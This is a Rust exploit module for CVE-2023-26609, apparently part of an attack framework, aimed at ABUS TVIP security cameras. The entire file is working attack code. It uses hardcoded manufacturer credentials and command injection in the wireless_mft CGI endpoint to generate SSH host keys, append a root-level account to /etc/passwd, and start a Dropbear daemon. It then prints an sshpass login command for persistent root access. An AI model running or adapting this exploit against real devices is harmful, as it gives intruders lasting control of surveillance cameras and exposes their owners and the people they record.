// Exploit Title: ABUS Security Camera TVIP 20000-21150 - SSH Root Persistence
// CVE: CVE-2023-26609
// Variant 2 - Dropbear SSH Persistence with custom username

use anyhow::Result;
use colored::*;
use md5;
use reqwest::Client;
use std::io::{self, Write};
use std::time::Duration;

const DEFAULT_TIMEOUT_SECS: u64 = 10;

/// Normalize IPv6 targets, collapsing any number of outer brackets
/// and preserving an explicit port if one was given as `[...] : port`.
fn normalize_target(raw: &str) -> String {
    // Case: bracketed IPv6 with port, e.g. "[[::1]]:8080"
    if raw.contains("]:") {
        if let Some(idx) = raw.rfind("]:") {
            let addr_raw = &raw[..idx];
            let port = &raw[idx + 2..];
            // strip ALL brackets from the address portion
            let addr_inner = addr_raw
                .trim_start_matches('[')
                .trim_end_matches(']')
                .to_string();
            return format!("[{}]:{}", addr_inner, port);
        }
    }
    // Otherwise, remove any outer brackets entirely...
    let inner = raw
        .trim_start_matches('[')
        .trim_end_matches(']')
        .to_string();
    // ...and only re-wrap in brackets if it's a bare IPv6 (contains a colon).
    if inner.contains(':') {
        format!("[{}]", inner)
    } else {
        inner
    }
}

/// Send a command using the vulnerable RCE endpoint
async fn exploit_rce(client: &Client, target: &str, cmd: &str) -> Result<()> {
    let normalized = normalize_target(target);
    let url = format!(
        "http://manufacture:erutcafunam@{}/cgi-bin/mft/wireless_mft?ap=inject;{}",
        normalized, cmd
    );
    println!("{}", format!("[*] Sending RCE payload: {}", cmd).cyan());

    let resp = client.get(&url).send().await?;
    let status = resp.status();
    let body = resp.text().await?;
    
    if status.is_success() {
        println!("{}", format!("[+] Status: {}", status).green());
        println!("{}", "[+] Response:".green());
        println!("{}", body);
    } else {
        println!("{}", format!("[-] Status: {}", status).red());
        println!("{}", format!("[-] Response:\n{}", body).red());
    }

    Ok(())
}

/// Generate Dropbear SSH keys on the target system
async fn generate_ssh_key(client: &Client, target: &str) -> Result<()> {
    let cmd = "/etc/dropbear/dropbearkey%20-t%20rsa%20-f%20/etc/dropbear/dropbear_rsa_host_key";
    println!("{}", "[*] Stage 1: Generating Dropbear SSH key...".yellow());
    exploit_rce(client, target, cmd).await
}

/// Inject a root user with a hashed password into /etc/passwd
async fn inject_root_user(client: &Client, target: &str, user: &str, hash: &str) -> Result<()> {
    let payload = format!(
        "echo%20{}:{}:0:0:root:/:/bin/sh%20>>%20/etc/passwd",
        user, hash
    );
    println!("{}", format!("[*] Stage 2: Injecting user '{}' with root privileges...", user).yellow());
    exploit_rce(client, target, &payload).await
}

/// Start Dropbear SSH daemon
async fn start_dropbear(client: &Client, target: &str) -> Result<()> {
    let cmd = "/etc/dropbear/dropbear%20-E%20-F";
    println!("{}", "[*] Stage 3: Starting Dropbear SSH daemon...".yellow());
    exploit_rce(client, target, cmd).await
}

/// Generate an MD5 hash of the given password
fn generate_md5_hash(password: &str) -> String {
    let digest = md5::compute(password.as_bytes());
    format!("{:x}", digest)
}

/// Display module banner
fn display_banner() {
    println!("{}", "╔═══════════════════════════════════════════════════════════╗".cyan());
    println!("{}", "║   ABUS Security Camera TVIP 20000-21150 Exploit           ║".cyan());
    println!("{}", "║   CVE-2023-26609 - Dropbear SSH Persistence               ║".cyan());
    println!("{}", "║   Variant 2 - Custom Username SSH Root Access             ║".cyan());
    println!("{}", "╚═══════════════════════════════════════════════════════════╝".cyan());
}

/// Main interactive flow: get user/pass, hash it, and inject persistence
async fn execute_flow(target: &str) -> Result<()> {
    let client = Client::builder()
        .danger_accept_invalid_certs(true)
        .timeout(Duration::from_secs(DEFAULT_TIMEOUT_SECS))
        .build()?;

    display_banner();
    println!("{}", format!("[*] Target: {}", target).yellow());
    println!();

    print!("{}", "Enter username to inject: ".cyan().bold());
    io::stdout().flush()?;
    let mut user = String::new();
    io::stdin().read_line(&mut user)?;
    let user = user.trim();

    if user.is_empty() {
        println!("{}", "[-] Username cannot be empty".red());
        return Err(anyhow::anyhow!("Username cannot be empty"));
    }

    print!("{}", "Enter password (will be hashed): ".cyan().bold());
    io::stdout().flush()?;
    let mut pass = String::new();
    io::stdin().read_line(&mut pass)?;
    let pass = pass.trim();

    if pass.is_empty() {
        println!("{}", "[-] Password cannot be empty".red());
        return Err(anyhow::anyhow!("Password cannot be empty"));
    }

    // Hash it!
    let hash = generate_md5_hash(pass);
    println!("{}", format!("[*] Generated MD5 hash: {}", hash).cyan());
    println!();

    // Run each step
    generate_ssh_key(&client, target).await?;
    inject_root_user(&client, target, user, &hash).await?;
    start_dropbear(&client, target).await?;

    println!();
    println!("{}", "[+] Persistence complete! You can now SSH in with:".green().bold());
    println!(
        "{}",
        format!(
            "    sshpass -p '{}' ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 \\\n         -oHostKeyAlgorithms=+ssh-rsa {}@{}",
            pass, user, target
        ).cyan()
    );
    Ok(())
}

/// Dispatcher entry-point for the auto-dispatch framework
pub async fn run(target: &str) -> Result<()> {
    execute_flow(target).await
}
